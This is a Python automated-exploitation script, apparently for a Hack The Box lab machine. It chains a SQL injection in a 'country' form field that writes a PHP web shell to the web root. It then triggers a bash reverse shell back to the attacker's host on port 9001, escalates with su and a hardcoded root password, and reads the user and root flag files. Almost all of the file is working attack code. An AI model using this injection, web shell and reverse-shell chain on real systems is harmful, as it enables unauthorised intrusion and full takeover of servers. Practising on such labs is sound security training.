#coded by vanishyi
#My first autopwn!
import requests
import subprocess
import time
import os
from pwn import *
        
        
ip = input("put in the target ip address:").replace('\n','')

lhost = input("put in the lhost ip:").replace('\n','')

url = "http://"+ip+"/"
p1 = {
    'username':'admin',
    'country':"""Brazil' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -"""
}
requests.post(url,data=p1)


p2 = "cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{}/9001+0>%261'".format(lhost)
shell = (url + 'shell.php?' + p2)


filepath = os.getcwd()
file_name='HTB_validation_tempdoc.py'
temp_path = filepath + file_name
with open(file_name, 'w') as f:
    f.write('import requests\n'+'import time\n'+'time.sleep(3)\n'+'shell = \"'+shell+'\"\n'+'requests.post(shell)')
subprocess.Popen('python3 HTB_validation_tempdoc.py',shell = True)
        

pwn = listen(9001).wait_for_connection()
pwn.sendline('su')
time.sleep(2)
pwn.sendline('uhc-9qual-global-pw')
time.sleep(2)
pwn.sendline('echo user+root')
pwn.sendline('cat /home/htb/user.txt')
print('user:'+pwn.recvlineS())
pwn.sendline('cat /root/root.txt')
pwn.interactive()


#subprocess.run('rm HTB_validation_tempdoc.py',shell = True)
